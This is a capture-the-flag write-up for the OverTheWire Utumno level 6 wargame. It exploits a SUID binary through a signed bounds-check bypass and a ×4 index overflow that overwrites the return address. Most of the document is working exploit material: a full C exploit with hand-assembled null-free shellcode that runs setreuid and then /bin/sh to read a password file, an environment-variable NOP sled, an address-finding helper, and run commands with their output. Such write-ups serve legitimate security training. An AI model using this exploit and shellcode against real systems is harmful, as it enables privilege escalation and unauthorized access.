# OverTheWire — Utumno Level 6 Solution (utumno6 → utumno7)

> Goal: Get utumno7 user's password from `utumno6`.
> Technique: **Signed bounds check bypass + integer (×4) overflow** for arbitrary write →
> overwrite return address directly; env-var shellcode on executable stack + embedded `cat`.

---

## 1. Connection

```bash
ssh utumno6@utumno.labs.overthewire.org -p 2227
# password: **********   (from the previous level)
```

---

## 2. Recon

```bash
ls -la /utumno/utumno6
# -r-sr-x--- 1 utumno7 utumno6 13212 utumno6   <-- SUID utumno7, group utumno6 = READABLE
strings /utumno/utumno6
#   malloc, strtoul, strcpy, printf
#   "Missing args", "Illegal position in table, quitting..",
#   "Table position %d has value %d", "Description: %s"
#   ... -fno-stack-protector ...                <-- NO canary
readelf -l /utumno/utumno6 | grep GNU_STACK     #   RWE -> stack EXECUTABLE
```

---

## 3. Static Analysis — `main`

```bash
objdump -d -M intel /utumno/utumno6 | sed -n '/<main>:/,/^$/p'
```

Pseudocode:
```c
int main(int argc, char **argv) {
    int table[?];                          // ebp-0x30
    if (argc <= 2) { puts("Missing args"); exit(1); }       // argc >= 3 required
    void *ptr = malloc(0x20);
    if (!ptr) { puts("Sorry, ran out of memory"); exit(1); }
    unsigned value    = strtoul(argv[2], NULL, 16);         // [ebp-0x4]
    unsigned position = strtoul(argv[1], NULL, 10);         // [ebp-0x8]
    if ((int)position > 10) { puts("Illegal position..."); exit(1); }   // SIGNED check!
    table[position] = value;               // mov [ebp + position*4 - 0x30], value
    strcpy(ptr, argv[3]);                  // heap copy (harmless)
    printf("Table position %d has value %d\nDescription: %s\n", position, table[position], ptr);
    return 0;
}
```

### Two vulnerabilities combine
1. **Signed bounds check:** `if ((int)position > 10) exit;` → `position` is compared as
   **signed**. A large unsigned value with the high bit set **looks negative** → `≤ 10` check passes.
2. **`table[position] = value`** ⇒ `mov [ebp + position*4 - 0x30], value` → arbitrary (relative) write.

### Writing to return address — `×4` wraparound
Return address is at `ebp+4`. We need: `ebp + position*4 - 0x30 = ebp+4` ⇒ `position*4 ≡ 0x34 (mod 2^32)`.
- `position = 0xD (13)` gives exactly `0x34` but `13 > 10` → check fails.
- **`position = 0x8000000D = 2147483661`**:
  - Signed = `-2147483635` → `≤ 10` ⇒ **check passes**.
  - `position*4 = 0x200000034` → truncated to 32 bits = **`0x34`** ⇒ write address = `ebp+4` = **return address!**

⇒ `argv[1] = "2147483661"`, `argv[2] = <hex EGG sled address>` → return address = shellcode.
Normal argc (≥3) works here — no argc trick needed.

---

## 4. Final Exploit

`argv = {"/utumno/utumno6", "2147483661", "<hex>", "x"}`; `envp = {EGG=sled+shellcode, NULL}`.

### `ex6.c`
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno7" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x37, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
static char eggenv[4+SLED+256];
static char *envp[2];
int main(int argc,char**argv){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 envp[0]=eggenv; envp[1]=0;
 if(argc>=2 && !strcmp(argv[1],"find")){
   char *av[]={"/tmp/q7Bn3kLm9z","2147483661","41414141","x",0}; execve("/tmp/q7Bn3kLm9z",av,envp);
 } else if(argc>=3 && !strcmp(argv[1],"run")){
   char *av[]={"/utumno/utumno6","2147483661",argv[2],"x",0}; execve("/utumno/utumno6",av,envp);
 }
 perror("execve"); return 1;
}
```

### `pr.c`
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Execution
```bash
gcc -m32 -o ex6 ex6.c
gcc -m32 -o /tmp/q7Bn3kLm9z pr.c        # 15-char path, FRESH (avoid /tmp ownership conflicts)

ENV0=$(./ex6 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")
./ex6 run "$RET"        # table[0x8000000D]=RET -> ret overwritten -> sled -> cat
```

Output:
```
ENV0=fffef51f RET=ffff6a53
Table position -2147483635 has value -38317
Description: x
**********
```
(`value -38317` = signed representation of `0xffff6a53` — proof the overflow write worked.)

---

## 5. Verification

```bash
ssh utumno7@utumno.labs.overthewire.org -p 2227
# password: **********
```
```
uid=16007(utumno7) gid=16007(utumno7) groups=16007(utumno7)
$ cat /etc/utumno_pass/utumno7
**********
```
✅ Success.

---

## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **Signed bounds bypass** | `(int)position > 10` check; high-bit unsigned looks negative → passes |
| **Array index = arbitrary write** | `table[position]=value` → `mov [ebp+position*4-0x30], value` |
| **`×4` wraparound** | `position=0x8000000D` → `*4 mod 2^32 = 0x34` → exactly `ebp+4` (return address) |
| **Normal argv** | argc≥3 is sufficient; no argc trick needed this time |
| **Fresh /tmp path** | Use new 15-char printer path to avoid ownership conflicts with previous levels |
